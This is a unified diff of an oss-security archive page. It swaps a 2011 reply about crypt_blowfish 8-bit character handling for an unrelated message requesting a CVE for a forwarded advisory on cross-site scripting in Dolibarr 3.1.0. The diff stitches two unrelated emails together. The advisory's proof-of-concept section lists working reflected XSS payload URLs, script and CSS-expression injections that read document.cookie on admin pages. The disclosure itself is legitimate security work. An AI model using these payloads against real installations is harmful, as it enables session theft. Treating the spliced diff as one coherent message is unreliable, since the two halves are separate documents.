@@ -1,31 +1,80 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/27/10
-Message-ID: <Pine.LNX.4.64.1106271743170.17115@wotan.suse.de>
-Date: Mon, 27 Jun 2011 17:44:42 +0200 (CEST)
-From: Michael Matz <matz@...e.de>
-To: Ludwig Nussel <ludwig.nussel@...e.de>
-Cc: oss-security@...ts.openwall.com, Thorsten Kukuk <kukuk@...e.de>, Andreas Jaeger <aj@...e.de>
-Subject: Re: CVE request: crypt_blowfish 8-bit character mishandling
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/21/6
+Message-ID: <20111121092944.GA16253@foo.fgeek.fi>
+Date: Mon, 21 Nov 2011 11:29:44 +0200
+From: Henri Salo <henri@...v.fi>
+To: oss-security@...ts.openwall.com
+Subject: Fwd: Multiple Cross-Site-Scripting vulnerabilities in Dolibarr 3.1.0
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Can I get CVE-identifier for this issue, thank you? I verified from infoserve.de that they haven't already requested one.
 
-On Mon, 27 Jun 2011, Ludwig Nussel wrote:
+Best regards,
+Henri Salo
 
-> > Additionally, for the paranoid, when the option to treat 2a as 2x is 
-> > disabled, disallow logins with passwords containing 0xff chars 
-> > (possible attack).  Maybe only for 2a hashes, but not for 2y.  In 
-> > order not to leak this fact via timings, perform the hashing anyway.  
-> > (I'll consider making this built-in in a new version of 
-> > crypt_blowfish, which should let us be more careful with timings.)
-> 
-> Ok, so we'd need two config options, one to toggle signedness bug compat 
-> mode (2a=2x) and one to disallow 0xff if compat mode is off.
+----- Forwarded message from security@...oserve.de -----
 
-What's this 0xff business that crept up recently?  It's all characters 
-with the high bit set, not just 0xff, that pose problems.  Let's be 
-precise with these issues.
+Date: Wed, 9 Nov 2011 09:59:18 GMT
+From: security@...oserve.de
+To: bugtraq@...urityfocus.com
+Subject: Multiple Cross-Site-Scripting vulnerabilities in Dolibarr 3.1.0
+X-Mailer: MIME-tools 5.420 (Entity 5.420)
 
+Advisory:               Multiple Cross-Site-Scripting vulnerabilities in Dolibarr 3.1.0
+Advisory ID:           	INFOSERVE-ADV2011-03
+Author:                	Stefan Schurtz
+Contact:		security@...oserve.de
+Affected Software:  	Successfully tested on Dolibarr 3.1.0 other versions may also be affected
+Vendor URL:          	http://www.dolibarr.org/
+Vendor Status:       	fixed in the 3.1 branch
 
-Ciao,
-Michael.
+==========================
+Vulnerability Description
+==========================
+
+Dolibarr 3.1.0 is prone to multiple XSS vulnerability
+
+==================
+PoC-Exploit
+==================
+
+Cross-Site-Scripting - parameter 'username'
+
+http://<target>/admin/company.php?mainmenu=home&leftmenu=setup&username='"</script><script>alert(document.cookie)</script>
+http://<target>/admin/company.php?mainmenu=home&leftmenu=setup&username='"</script><script>alert(document.cookie)</script>&=3&optioncss=print
+
+IE-only
+
+http://<target>/admin/security_other.php/" stYle="x:expre/**/ssion(alert(document.cookie))
+http://<target>/admin/events.php/" stYle="x:expre/**/ssion(alert(document.cookie))
+http://<target>/admin/user.php/" stYle="x:expre/**/ssion(alert(document.cookie))
+
+=========
+Solution:
+=========
+
+Fixed in the 3.1 branch
+
+====================
+Disclosure Timeline:
+====================
+
+08-Nov-2011 - vendor informed
+09-Nov-2011 - vendor fix in the 3.1 branch
+ 
+========
+Credits:
+========
+
+Vulnerabilities found and advisory written by INFOSERVE Security Team
+
+===========
+References:
+===========
+
+https://doliforge.org/tracker/?func=detail&aid=232&group_id=144
+https://github.com/Dolibarr/dolibarr/commit/762f98ab4137749d0993612b4e3544a4207e78a1
+http://www.dolibarr.org/
+http://www.infoserve.de/
+
+----- End forwarded message -----
